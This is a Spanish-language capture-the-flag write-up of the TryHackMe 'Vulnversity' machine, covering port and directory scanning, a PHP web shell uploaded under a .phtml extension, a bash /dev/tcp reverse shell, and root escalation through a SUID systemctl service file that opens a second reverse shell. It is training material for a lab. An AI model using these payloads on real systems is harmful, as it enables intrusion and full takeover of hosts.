# Vulnversity - TryHackMe

## Reconocimiento

Vamos a realizar un escaneo de puertos con nmap.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.190.165 -Pn -oG allPorts

PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 62
22/tcp   open  ssh          syn-ack ttl 62
139/tcp  open  netbios-ssn  syn-ack ttl 62
445/tcp  open  microsoft-ds syn-ack ttl 62
3128/tcp open  squid-http   syn-ack ttl 62
3333/tcp open  dec-notes    syn-ack ttl 62
```

Vamos a ver que versiones de los servicios están corriendo en los puertos abiertos.

```bash
nmap -sCV -p21,22,139,445,3128,3333 10.129.190.165

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 db:9d:72:3c:37:fe:27:b5:fd:db:e9:b1:86:d8:e0:7c (RSA)
|   256 0e:0b:08:37:4f:4a:15:f9:7b:4a:6a:e6:7f:4b:2e:86 (ECDSA)
|_  256 d5:55:45:0f:88:bb:1e:92:7b:36:f0:29:46:12:3f:66 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-07-30T16:38:18
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: -44s
```

Vemos que hay protocolos FTP,SSH,SMB y HTTP corriendo en la máquina además dde un Squid proxy.

Al tratar de meternos en http://10.129.190.165:3333 vemos una página de la universidad.

![alt text](image.png)

Hagamos un escaneo de directorios con gobuster para ver si encontramos algo interesante.

```bash
gobuster dir -u http://10.129.190.165:3333/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --exclude-length 10701 -x txt,js,php,xml,bak

internal             (Status: 301) [Size: 326] [--> http://10.129.190.165:3333/internal/]
```

Vemos que hay un directorio llamado "internal" que nos redirige a http://10.129.190.165:3333/internal/ donde vemos una página de subida de archivos.

Al interceptar la petición con Burp Suite vemos lo siguiente tras tratar de subir cmd.php con el contenido `<?php system($_GET['cmd']); ?>`:

```
------geckoformboundary1ed1a19c7f67cfb437460498ab34fa40
Content-Disposition: form-data; name="file"; filename="cmd.php"
Content-Type: application/x-php

<?php
    system($_GET['cmd']);
?>

------geckoformboundary1ed1a19c7f67cfb437460498ab34fa40
Content-Disposition: form-data; name="submit"

Submit
------geckoformboundary1ed1a19c7f67cfb437460498ab34fa40--
```

Nos devuelve: Extension not allowed

Por lo que trataremos de probar difrentes extensiones php:

php5
**phtml**

He adivinado a la segunda.

Vamos a http://10.129.190.165:3333/internal/uploads/cmd.phtml?cmd=whoami y vemos que nos devuelve el usuario www-data.

Vamos a entablar una reverse shell con netcat.

```bash
nc -lvnp 443
```

http://10.129.190.165:3333/internal/uploads/cmd.phtml?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.154.96/443 0>%261'

Hagamos ahora un tratamiento de la TTY:

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 40 columns 120
```

Vamos a /home y vemos la flag de usuario, el cual se llama bill.

Vamos a buscar ficheros con permisos de usuario root con el comando find:

```bash
find / -perm -4000 2>/dev/null

/bin/systemctl
```

Vemos este inusual fichero con SUID, al entrar en https://gtfobins.org/gtfobins/systemctl/#shell vemos como poder escalar privilegios:

```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.154.96/443 0>&1"
[Install]
WantedBy=multi-user.target' >/tmp/temp-file.service
systemctl link /tmp/temp-file.service
systemctl enable --now /tmp/temp-file.service
```

Lo hemos adaptado a nuestra reverse shell y lo ejecutamos, obteniendo una shell como root.

```bash
root@ip-10-129-190-165:/# whoami
root
